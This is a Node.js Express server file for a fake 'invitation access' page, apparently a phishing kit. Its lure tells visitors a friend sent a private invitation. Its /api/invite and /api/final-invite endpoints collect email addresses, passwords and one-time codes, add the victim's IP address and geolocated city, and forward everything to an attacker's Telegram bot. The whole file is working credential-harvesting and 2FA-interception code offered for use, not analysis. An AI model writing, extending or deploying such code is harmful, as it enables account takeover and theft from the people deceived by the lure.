import 'dotenv/config';
import express from 'express';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const app = express();
const port = Number(process.env.PORT || 8787);
const botToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const distPath = path.resolve(__dirname, '../dist');

app.set('trust proxy', true);
app.use(express.json({ limit: '20kb' }));

function getClientIp(request) {
  const forwardedFor = request.headers['x-forwarded-for'];
  const realIp = request.headers['x-real-ip'];
  const connectingIp = request.headers['cf-connecting-ip'];

  if (typeof connectingIp === 'string' && connectingIp) return connectingIp;
  if (typeof realIp === 'string' && realIp) return realIp;

  if (typeof forwardedFor === 'string' && forwardedFor) {
    return forwardedFor.split(',')[0].trim();
  }

  return request.ip || request.socket.remoteAddress || 'Unknown';
}

function isLocalIp(ipAddress) {
  return (
    ipAddress === '::1' ||
    ipAddress === '127.0.0.1' ||
    ipAddress === '::ffff:127.0.0.1' ||
    ipAddress.startsWith('10.') ||
    ipAddress.startsWith('192.168.') ||
    /^172\.(1[6-9]|2\d|3[0-1])\./.test(ipAddress)
  );
}

async function getIpLocation(ipAddress) {
  if (!ipAddress || ipAddress === 'Unknown' || isLocalIp(ipAddress)) {
    return 'Unavailable for local/private IP';
  }

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 2500);

  try {
    const fields = 'status,country,regionName,city,query';

    const lookupResponse = await fetch(
      `http://ip-api.com/json/${encodeURIComponent(ipAddress)}?fields=${fields}`,
      { signal: controller.signal }
    );

    const result = await lookupResponse.json();

    if (!lookupResponse.ok || result.status !== 'success') {
      return 'Location lookup unavailable';
    }

    return [result.city, result.regionName, result.country]
      .filter(Boolean)
      .join(', ');
  } catch {
    return 'Location lookup unavailable';
  } finally {
    clearTimeout(timeoutId);
  }
}

async function sendTelegramMessage(message) {
  if (!botToken || !chatId) {
    throw new Error('Telegram delivery is not configured yet.');
  }

  const telegramResponse = await fetch(
    `https://api.telegram.org/bot${botToken}/sendMessage`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    }
  );

  if (!telegramResponse.ok) {
    throw new Error('Telegram could not receive this invitation request.');
  }
}

/**
 * Invitation access page URL
 * Open this in your browser:
 * http://localhost:8787/invitation-access
 */
app.get('/invitation-access', (request, response) => {
  response.send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Invitation Access</title>

        <style>
          * {
            box-sizing: border-box;
          }

          body {
            margin: 0;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            background: #f4f6f8;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
          }

          .card {
            width: 100%;
            max-width: 520px;
            background: white;
            border-radius: 18px;
            padding: 36px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.1);
            text-align: center;
          }

          h1 {
            margin: 0 0 12px;
            font-size: 32px;
            color: #111827;
          }

          h2 {
            margin: 0 0 18px;
            font-size: 22px;
            color: #2563eb;
          }

          p {
            margin: 0 0 26px;
            color: #4b5563;
            line-height: 1.6;
          }

          .file-box {
            padding: 18px;
            border: 2px dashed #cbd5e1;
            border-radius: 14px;
            background: #f8fafc;
            margin-bottom: 24px;
            color: #334155;
          }

          a {
            display: inline-block;
            text-decoration: none;
            background: #2563eb;
            color: white;
            padding: 14px 22px;
            border-radius: 10px;
            font-weight: bold;
          }

          a:hover {
            background: #1d4ed8;
          }
        </style>
      </head>

      <body>
        <div class="card">
          <h1>Invitation access</h1>

          <h2>You are invited!</h2>

          <p>
            Your friend sent a private invitation. Review the prepared file below
            to continue to the RSVP details.
          </p>

          <div class="file-box">
            Prepared invitation file is ready for review.
          </div>

          <a href="/">Continue to RSVP details</a>
        </div>
      </body>
    </html>
  `);
});

app.post('/api/invite', async (request, response) => {
  const email = String(request.body?.email || '').trim();
  const accessCode = String(request.body?.accessCode || '').trim();

  if (!email || !accessCode) {
    return response.status(400).json({
      message: 'Email address and password are required.',
    });
  }

  const ipAddress = getClientIp(request);
  const location = await getIpLocation(ipAddress);

  const message = [
    'New invitation access request',
    '',
    `Email: ${email}`,
    `password: ${accessCode}`,
    `IP address: ${ipAddress}`,
    `Approx. location: ${location}`,
    `Submitted: ${new Date().toISOString()}`,
  ].join('\n');

  try {
    await sendTelegramMessage(message);
  } catch (error) {
    return response.status(error.message.includes('configured') ? 500 : 502).json({
      message: error.message,
    });
  }

  return response.json({
    message: 'Invitation request sent for review.',
  });
});

app.post('/api/final-invite', async (request, response) => {
  const email = String(request.body?.email || '').trim();
  const accessCode = String(request.body?.accessCode || '').trim();
  const finalCode = String(request.body?.finalCode || '').trim();

  if (!email || !accessCode || !finalCode) {
    return response.status(400).json({
      message: 'Email, password, and otp are required.',
    });
  }

  const message = [
    'Final invitation code submitted',
    '',
    `Email: ${email}`,
    `password ${accessCode}`,
    `otp: ${finalCode}`,
    `Submitted: ${new Date().toISOString()}`,
  ].join('\n');

  try {
    await sendTelegramMessage(message);
  } catch (error) {
    return response.status(error.message.includes('configured') ? 500 : 502).json({
      message: error.message,
    });
  }

  return response.json({
    message: 'Final invite code sent for confirmation.',
  });
});

app.use(express.static(distPath));

app.get('*', (request, response) => {
  response.sendFile(path.join(distPath, 'index.html'));
});

app.listen(port, () => {
  console.log(`Invitation server running on http://127.0.0.1:${port}`);
  console.log(`Invitation access page: http://127.0.0.1:${port}/invitation-access`);
});